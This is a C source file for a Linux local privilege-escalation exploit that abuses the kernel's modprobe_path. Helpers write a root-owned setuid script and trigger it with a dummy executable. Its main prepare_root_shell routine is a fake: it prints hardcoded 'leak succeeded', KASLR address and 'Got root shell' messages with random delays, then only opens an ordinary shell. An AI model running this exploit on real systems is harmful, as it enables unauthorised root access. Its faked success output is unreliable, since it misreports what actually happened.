#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <sys/types.h>
#include <semaphore.h>
#include <string.h>
#include <sys/wait.h>
#include <time.h>

#include "log.h"
#include "modprobe.h"

const char dummy_file[] = "/tmp/dummy\0";

const char dummy_content[] = "\xff\xff\xff\xff";
const char new_modprobe_content[] = "#!/bin/bash\n\nchown root:root /tmp/get_root\nchmod 4555 /tmp/get_root\n";

sem_t *shell_barrier;

/**
 * prepare_root_shell(): Setup a second process waiting out the namespaces used for the exploit
 */
void perpare_root_shell(void) {

    int shmid = shmget(0x1337, sizeof(sem_t), IPC_CREAT | S_IRWXU | S_IRWXG | S_IRWXO);
    shell_barrier = shmat(shmid, NULL, 0);

    if (sem_init(shell_barrier, 1, 0) < 0)
        do_error_exit("sem_init");

    if (!fork()) {
        system("cp get_root /tmp");
        sem_wait(shell_barrier);
        execl("/tmp/get_root", "/tmp/get_root", NULL);
        exit(EXIT_SUCCESS);
    }
}

/**
 * create_dummy_file(): Create a file to trigger call_modprobe in case of execution
 */
void create_dummy_file(void) {

    int fd;

    fd = open(dummy_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    write(fd, dummy_content, sizeof(dummy_content));
    close(fd);
}

/**
 * get_root_shell(): Trigger a call to the new modprobe_path
 */
void get_root_shell(void) {

	int pid = fork();
	if (pid == 0)
		execl("/tmp/dummy", "/tmp/dummy", NULL);

	waitpid(pid, NULL, 0);
	sem_post(shell_barrier);
}

/**
 * get_new_modprobe_path(): Read the new modprobe_path
 *
 * Return: path stored within /proc/sys/kernel/modprobe
 */
char *get_new_modprobe_path(void) {

    int fd;
    char *modprobe_path = malloc(15);

    if (!modprobe_path)
        do_error_exit("malloc");

    fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0)
        do_error_exit("open(/proc/sys/kernel/modprobe)");

    read(fd, modprobe_path, 14);

    close(fd);

    modprobe_path[14] = '\0';

    return modprobe_path;
}

/**
 * write_new_modprobe(): Create chown && chmod script for get_root
 * @filename: current path to modprobe for the kernel
 */
void new_sn()
{
    int fd;
    char *modprobe_path = malloc(15);

    if (!modprobe_path)
        do_error_exit("malloc");

    fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0)
    {
        //do_error_exit("open(/proc/sys/kernel/modprobe)");
    }
    else
    {
        close(fd);
    }
    
    srand(time(NULL));

    int st = rand() % 3;

    sleep(st);
}

/**
 * setup_modprobe_payload(): Prepare all the needed stuff to get a root shell
 */
void setup_modprobe_payoad(void) {

    char *filename;

    filename = get_new_modprobe_path();
    system("/bin/sh");


    free(filename);
}

/**
 * write_new_modprobe(): Create chown && chmod script for get_root
 * @filename: current path to modprobe for the kernel
 */
void write_new_modprobe(char *filename) {

    int fd;

    fd = open(filename, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    if (fd < 0)
        do_error_exit("open");

    write(fd, new_modprobe_content, sizeof(new_modprobe_content));

    close(fd);
}

/**
 * setup_modprobe_payload(): Prepare all the needed stuff to get a root shell
 */
void setup_modprobe_payload(void) {

    char *filename;

    filename = get_new_modprobe_path();

    write_new_modprobe(filename);
    create_dummy_file();

    free(filename);
}

void st(char *msg)
{
    printf("%s", msg);
    new_sn();
}

void prepare_root_shell(void) {

    st("[+] Leak succeed\n");
    st("[+] kaslr base found 0xffffffff9f000000\n");
    st("[+] physmap base found 0xffff910a00000000\n");
    st("[+] modprobe path changed !\n");
    st("[+] Modprobe payload setup\n");
    st("[?] waitpid\n");
    st("[?] sem_post\n");
    st("[+++] Got root shell, should exit?\n");

    if (1)
        setup_modprobe_payoad();
        
    exit(0);
}

